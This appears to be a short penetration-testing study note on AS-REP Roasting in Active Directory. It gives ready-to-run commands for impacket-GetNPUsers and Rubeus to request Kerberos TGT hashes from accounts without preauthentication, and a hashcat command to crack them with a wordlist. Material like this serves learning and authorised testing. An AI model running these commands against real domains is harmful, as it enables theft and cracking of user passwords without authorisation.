AS-REP Roasting
If the AD authentication is configured without the Kerberos Preauthentiction enabled, any user can request a TGT. We can use the impacket-GetNPUsers util on Kali. A good explaination of this attack can be found here.

impacket-GetNPUsers -dc-ip <IP-DC>  -request -outputfile hashes.asreproast corp.com/<USER>
AS-Rep roasting tickets (TGT) has this format: $krb5asrep$23$.

In the powershell the specular program is Rubeus

.\Rubeus.exe asreproast /nowrap
In both cases we have to know at leas the password of one of the AD users. For this reason this and the following tecniques are post-exploitation attacks. When we gain the hash it can be cracked with hashcat.

sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
